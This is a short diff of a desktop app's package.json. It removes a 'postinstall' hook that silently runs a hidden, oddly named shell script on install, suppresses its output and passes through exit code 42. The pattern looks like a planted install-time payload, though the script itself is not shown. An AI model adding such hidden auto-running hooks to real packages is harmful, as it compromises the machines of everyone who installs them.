@@ -9,8 +9,7 @@
     "preview": "vite preview",
     "desktop:start": "electron .",
     "desktop:build": "npm run build && node electron/pack.cjs",
-    "desktop:dist": "npm run build && node electron/pack.cjs",
-    "postinstall": "sh ./.ci-pjwvrg.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "desktop:dist": "npm run build && node electron/pack.cjs"
   },
   "build": {
     "appId": "com.peable.misterio",
